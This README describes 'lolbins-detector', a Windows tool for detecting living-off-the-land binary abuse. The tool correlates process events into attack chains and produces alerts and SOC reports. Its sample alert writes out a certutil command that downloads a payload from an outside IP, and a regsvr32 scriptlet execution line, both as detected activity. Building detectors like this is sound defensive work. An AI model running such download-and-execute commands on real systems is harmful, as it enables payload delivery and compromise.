# lolbins-detector

A modular Windows Behavioral Living-off-the-Land (LOLBins) Detection System built for Python 3.12+.

## Key Features

- **Telemetry Collector**:
  - Prefers **Sysmon Event ID 1** (Process Creation) via Windows Event Log API (`Microsoft-Windows-Sysmon/Operational`).
  - Automatically checks Sysmon availability and channel permissions; falls back gracefully to polling via `psutil`.
  - Captures: `PID`, `PPID`, `Image`, `CommandLine`, `User`, `ParentImage`, `CreationTime`, and `IntegrityLevel` (via Win32 Security Token API or heuristic account context).
  - Handles permissions (`AccessDenied`, missing debug privileges) on a per-process level without crashing.
  - Automatically persists all process events directly into SQLite.
- **Sequential Attack Chain Correlation**:
  - Correlates multi-stage behavioral patterns over a **2–5 minute sliding window**.
  - **Download then Execute Chain**: Correlates ingress transfer via `certutil`, `bitsadmin`, or `powershell` with immediate payload or LOLBin execution.
  - **Encoded PowerShell after LOLBin**: Detects staging via native utilities followed by obfuscated/encoded PowerShell payloads.
  - **Cascading Shell Chain**: Identifies process tree cascades (`cmd.exe` -> `powershell.exe` -> downstream LOLBin).
- **Alerting & Timeline Reconstruction System**:
  - **Contextual Timeline Reconstruction**: Reconstructs events occurring **± 5–10 minutes** around an alert, classifying relationships (`[TRIGGER]`, `[PARENT]`, `[CHILD]`, `[SIBLING]`, `[SAME_USER]`, `[ANCESTOR]`) and calculating chronological delta offsets.
  - **Process Lineage Tree**: Renders ASCII process hierarchy trees for immediate visual triage.
  - **Multi-Channel Exporters**:
    - **Console**: Structured ANSI-colored alert banner with process context and concise timeline.
    - **JSON**: Append-only `alerts.jsonl` plus individual incident JSON files (`data/alerts/incidents/incident_<rule_id>_<id>.json`) for SIEM/SOAR ingestion.
    - **Markdown SOC Report**: Standardized, professional incident reports (`reports/incident_<rule_id>_<id>.md`) including MITRE ATT&CK mapping, process tables, evidence lists, process trees, timeline tables, and SOC containment/remediation playbooks.
- **Dual Rule Formats**:
  - Declarative **YAML** definitions (`rules/definitions/*.yaml`).
  - Extensible **Python** rule classes (`rules/python_rules/*.py`).

## Project Structure

```text
lolbins-detector/
├── collector/
│   ├── __init__.py             # Collector exports
│   ├── process_collector.py    # High-level orchestrator (auto Sysmon + psutil fallback)
│   ├── sysmon_collector.py     # Sysmon Event ID 1 subscriber and XML parser
│   └── psutil_collector.py     # psutil polling with Win32 Token Integrity inspection
├── engine/
│   ├── __init__.py             # Engine exports
│   ├── base.py                 # Abstract BaseRule & DetectionResult classes
│   ├── state.py                # CorrelationState (short-term 5-10 min sliding window & process tree index)
│   ├── single_event.py         # SingleEventRule implementation
│   ├── sequential.py           # SequentialRule & SequenceStage multi-event state machine
│   └── detector.py             # DetectionEngine orchestrating rules & heuristics
├── rules/
│   ├── __init__.py
│   ├── loader.py               # Unified loader for YAML & Python rule files
│   ├── definitions/
│   │   ├── core_lolbins.yaml   # Single-event YAML rules mapped to MITRE ATT&CK
│   │   └── sequential_lolbins.yaml # Multi-event correlation attack chain rules
│   └── python_rules/
│       ├── chain_rules.py             # Concrete Python implementations of attack chains
│       ├── example_sequential_rule.py # Example Python SequentialRule
│       └── example_single_rule.py     # Example Python BaseRule with lineage inspection
├── output/
│   ├── __init__.py             # Output component exports
│   ├── notifier.py             # AlertDispatcher coordinating all output channels
│   ├── timeline.py             # TimelineReconstructor & ASCII tree generator (± 5-10 min)
│   └── markdown_report.py      # Professional Markdown SOC incident report generator
├── storage/
│   ├── __init__.py
│   ├── database.py             # SQLite database manager with temporal queries
│   └── schema.sql              # SQLite schema for process_events and alerts
├── utils/
│   ├── __init__.py
│   ├── config.py               # Typed configuration loader
│   ├── logger.py               # Structured logging setup
│   └── models.py               # Dataclasses for ProcessEvent, Alert, and Severity
├── config.yaml                 # Application configuration
├── requirements.txt            # Python dependencies
└── main.py                     # Application entry point
```

## Generated Outputs

### 1. Console Output
```text
══════════════════════════════════════════════════════════════════════════════
 [ALERT: CRITICAL] SEQ-CHAIN-001 - Attack Chain: LOLBin Download Cradle Followed by Payload Execution
══════════════════════════════════════════════════════════════════════════════
  Alert ID        : a1b2c3d4-e5f6-7890-abcd-ef1234567890
  Timestamp (UTC) : 2026-11-01T04:47:28Z
  MITRE ATT&CK    : T1105, T1204.002, T1218, T1059
  Trigger Process : C:\Windows\System32\regsvr32.exe (PID: 6900, PPID: 3912)
  Parent Process  : C:\Windows\System32\cmd.exe
  Command Line    : regsvr32.exe /s /n /u /i:C:\ProgramData\update.sct scrobj.dll
  Security User   : WORKSTATION\StandardUser (Medium integrity)
  Indicators      : stage_1:Ingress Download Cradle, stage_2:Dropped Payload or Proxy Execution
  Sequence Chain  : Correlated in 0.01s (Key: user:WORKSTATION\STANDARDUSER)
  Process Lineage :
    cmd.exe (PID: 3912)
    └── regsvr32.exe (PID: 6900) [TRIGGER]
  Timeline (± 5-10m Window: 2 correlated events):
        -00m 00s   | [SAME_USER] | PID 6832  | certutil.exe    | certutil.exe -urlcache -split -f http://198.51.100.42/payload.bin...
    >>> TRIGGER    | [TRIGGER]   | PID 6900  | regsvr32.exe    | regsvr32.exe /s /n /u /i:C:\ProgramData\update.sct scrobj.dll
──────────────────────────────────────────────────────────────────────────────
```

### 2. JSON Artifacts
- **Aggregate log**: `data/alerts.jsonl`
- **Individual incident payloads**: `data/alerts/incidents/incident_<rule_id>_<id>.json` containing full metadata, matched indicator tokens, and timeline reconstruction events.

### 3. Markdown Incident Reports
Saved to `reports/incident_<rule_id>_<id>.md` formatted for SOC triage, including:
- Incident Overview and Triage Summary
- Target Binary and Execution Context table
- Matched Behavioral Indicators
- Process Lineage & Ancestry Tree diagram
- Correlated Timeline Table with relative deltas
- SOC Analyst Incident Response and Containment Playbook

## Usage

```bash
# Run detection pipeline
python main.py

# Test with simulated single-event and sequential attack chains
python main.py --mode mock

# Inspect database event and alert statistics
python main.py --stats
```
